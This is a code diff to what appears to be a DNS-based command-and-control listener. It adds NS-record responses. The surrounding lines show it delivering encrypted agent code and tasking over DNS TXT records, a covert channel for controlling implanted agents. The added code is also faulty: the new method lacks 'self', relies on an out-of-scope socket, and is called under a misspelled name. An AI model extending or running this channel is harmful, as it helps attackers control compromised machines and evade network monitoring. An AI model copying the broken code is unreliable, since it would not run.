@@ -744,7 +744,13 @@ def send_message(packets=None):
                         encryptedAgent = encryption.aes_encrypt_then_hmac(sessionKey, zlib.compress(agentCode,9))
                         # TODO: wrap ^ in a routing packet?
                         self.send_payload_via_txt(hostname, sock, encryptedAgent, addr, txtstoptransfer)
-        
+
+    def send_ns_response(reply_hostname, reply_ipaddr, reply_addr_tuple):
+        reply = DNS(
+            ancount=1, qr=1,
+            an=DNSRR(rrname=str(reply_hostname), type='NS', rdata=reply_ipaddr, ttl=1234))
+        sock.sendto(bytes(reply), reply_addr_tuple)
+    
     def start_server(self, listenerOptions):
         """
         Threaded function that starts the faux DNS server
@@ -834,9 +840,14 @@ def send_message(packets=None):
                         elif host.startswith(taskingtxthostname):
                             print "[TASKING TXT]"
                             self.process_tasking_txt(host, sock, tasking_results, addr, ipack, txtstoptransfer)
-                        else:
-                            self.default_response()
-                        
+                    elif dns[DNSQR].qtype == 2:
+                        # NS request recvd
+                        if host.startswith(ns1hostname):
+                            self.send_ns_respone(hostname, ipns1, addr)
+                        elif host.startswith(ns2hostname):
+                            self.send_ns_respone(hostname, ipns2, addr)
+                    else:
+                        self.default_response()
         except (KeyboardInterrupt, SystemExit):
             # Don't kill the thread; instead stop the server.
             sock.close()
